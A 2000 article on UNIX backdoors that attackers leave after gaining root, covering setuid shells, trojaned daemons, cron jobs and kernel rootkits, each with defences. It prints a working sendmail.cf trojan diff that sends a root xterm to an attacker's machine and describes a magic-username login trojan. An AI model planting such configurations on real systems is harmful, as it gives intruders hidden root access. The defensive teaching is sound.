<p><b>June 28, 2000 - </b>Backdoors are by far one of the worst
nightmares of many system and network administrators. We all know
our networks and hosts will at some point be penetrated, and if
we've done our job right we should be able to detect that
penetration. However, one problem always rears its ugly head: Do
we format the drive, reinstall from trusted media, then patch the
system, configure it, and restore data from backups; or do we
just try to patch the system up and remove any surprises the
attacker may have left? In some cases it is clear-cut: For a
user's workstation with most data stored centrally, rebuilding
the system is far faster than trying to fix it. On the other
hand, what if you have a production email server handling
incoming email for 10,000 people and no backup machine to switch
to? </p>
<p>As with any security problem, we need to understand this
completely, which means learning how an attacker can place
backdoors on a system. Working from this point, it's relatively
simple to devise defenses. Because of the complexity in most UNIX
systems (network daemons, hundreds of installed programs, etc.),
there are many methods and places to squirrel away backdoors.
Basically, the attacker needs to have some form of network access
to the machine, e.g. a telnet account or the ability to send ICMP
packets. Also necessary is compromised software on the machine,
e.g. a setuid shell hidden in their home directory, or a Trojaned
login binary. </p>
<p>&nbsp;</p>
<h2>Hidden setuid/setgid Shells</h2>
<p>Once the attacker gains root, they simply make a copy of
/bin/bash (or their favorite shell), set its ownership to the
user or group root, and then set it setuid or setgid. Thus, when
they run the shell it runs with root privileges, and they can do
whatever they want to on the system. This is a somewhat clumsy
method, since such shells are easily detected by a simple</p>
<blockquote>
<p>find / -perm +6000 </p>
</blockquote>
<p>compared to a previous list of setuid and setgid binaries. To
avoid this, the attacker can simply label their setuid shell as a
normal (but unused) setuid program such as /sbin/restore. The
best way to detect this type of activity is to use a secure
cryptographic algorithm such as SHA1 to create signatures of
binary files, and compare them to detect any changes.
Additionally, you should audit the system for setuid and setgid
programs and try to remove as many of them as possible. Most
modern systems don't need the vast majority of them. An extension
of this is setuid/setgid programs that can be abused to gain root
access, for example dump. It is critical to keep these programs
up to date, which is one reason removing them is a very good
idea. </p>
<p>&nbsp;</p>
<h2>Trojaned Binaries and Configuration Files</h2>
<p>Any network daemons that run with root privileges, which many
of them do, are a prime target for compromise. There are versions
of login which, when fed a certain username (&quot;gotroot?&quot;
for example), spawn off a root shell without prompting for a
password. In addition, the more complicated a daemon is, the more
room for implanting a Trojan. A perfect example of this is
Sendmail. The following is output of a diff from a compromised
Red Hat 6.0 box's /etc/sendmail.cf:</p>
<pre>	# 1) Part
	# Here we define the Class(Like Array) of k85a86,87
	&gt; # Trojan Class definition
	&gt; Cktrojanhorse
	# 2) Part
	# here in Rules S0 we place a condition
	# LHS RHS Comment
	# If the format of e-mail is:
	# &quot;one of element in Class k&quot;@Something
	# then deliver through hack mailer, assign $2 to host
	# and $1 to username 605a608
	&gt; R$=k &lt; @$* &gt; $* $#hack $@ $2 $: $1 Trojan Mailer redirect
	# 3) Part
	# This is important, here we define the action... we send
	# an xterm to sender host 1157a1161,1164
	&gt;
	&gt; # Trojan Mailer
	&gt; Mhack, P=/usr/X11R6/bin/xterm, F=FMAlsSux, S=10/30, R=0,
	&gt; D=$z:/, A=xterm -display $s:0.0
  </pre>
<p>With this, all the attacker has to do is telnet to the box and
manually send mail as from <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5a2935373f35343f1a2e2835303b34323528293f">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>, and they receive
an xterm running as root on their box. This technique has the
disadvantage of being clear text in a config file. However, very
few administrators will ever dig through their sendmail.cf line
by line. The advantage is that if an admin does run software such
as Tripwire and notices that sendmail.cf has changed, they may
think it is routine system maintenance. One method to prevent
this type of behavior is to use <a href="http://www.wirex.com/subdomain.html">SubDomain</a>, which
prevents programs from accessing files and executing binaries
they shouldn't.</p>
<p>Another exploit floating around is a set of patches for SSH
that allow for the logging of passwords to a secret log file.
This one is particularly nasty for several reasons:</p>
<ul>
<li>Most users use the same passwords for multiple
accounts/services. </li>
<li>This file of passwords might be discovered by less
sophisticated attackers, who in turn may cause much
damage.</li>
</ul>
<p>Once an attacker gains root, the possibilities are endless.
This is why it is critical to have capabilities in place to
detect intrusions and their extent.</p>
<p>&nbsp;</p>
<h2>Running Programs Automatically</h2>
<p>Another way to get an xterm running as root to appear on your
machine would be to use cron, a program that runs tasks at
specified times. By editing root's crontab, or system crontab
entries, an attacker could easily set it to run xterm at 4:27
a.m. on every Wednesday - something most administrators would not
notice unless they checked their crontab entries regularly.
Restricting user access to cron and checking root's and the
system crontab entries regularly is encouraged. Another sneaky
way would be to modify a system script that is run weekly, say,
the script that runs &quot;updatedb&quot; (usually at 4 a.m.
Sunday), to fire up an xterm (or whatever) to the attackers
machine. Again, the best way to deal with this is to use Tripwire
or similar software to monitor changes to programs and
configuration files. It is also a good idea to backup these files
so you can compare them in future (using diff, for example).</p>
<p>&nbsp;</p>
<h2>Exploiting Known Holes</h2>
<p>Most systems have at least a few exploitable holes. If the
attacker is feeling brave and doesn't want to leave any traces,
they may elect to simply re-exploit the machine each time they
want to get in. This technique is quite effective at
universities, which tend to have hundreds and sometimes thousands
of poorly (if at all) maintained UNIX machines on their networks.
</p>
<p>&nbsp;</p>
<h2>Kernel Rootkits</h2>
<p>Rootkits are sets of tools to replace such system binaries as
ls and ps, so that the attacker can evade detection. These can be
found relatively quickly if the system is using a program such as
Tripwire correctly. However there is a better way to skin the
proverbial cat. By using a kernel rootkit, you can effectively
hide it from the admin with almost a 100% guarantee. Because it
is at such a low level of the system - at the kernel - it can
block and manipulate system calls, such as ones used to query
what kernel modules are loaded, what is in memory, and so on.
There are several defenses against this:</p>
<ul>
<li>Disable loadable kernel modules. </li>
<li>Remove kernel module manipulation tools. Note that the
attacker will probably then just upload their own. </li>
<li>Keep a copy of the current kernel and any needed modules
on trusted removable media. Consider rebooting the server
once in a while off of trusted media and copying the
trusted kernel and modules in. </li>
</ul>
<p>&nbsp;</p>
<h2>Summary</h2>
<p>In UNIX, and to a large extent in any modern network OS, there
are hundreds of hiding places to put backdoors and Trojans in.
The best way to defend against them is to reduce the complexity
of the system. For example, each server should have one primary
function, i.e. DNS, SMTP, POP, WWW, and so on. Remove any
unneeded software, especially anything that uses setuid or setgid
binaries. If possible, disable things such as kernel modules and
compile a static kernel. The chance to save 50K of memory by
having the tape drive support compiled in as a module generally
isn't worth the bother. Use multiple layers of security - for
example, have a firewall that blocks all outgoing packets except
for certain kinds, and possibly logs all the packets during off
hours. This way, if an attacker installs software that
&quot;dials&quot; home (for example, by sending out an xterm) the
firewall might block it, or at least log it. Install and use
software like Tripwire properly, and have a set of valid check
sums.</p>
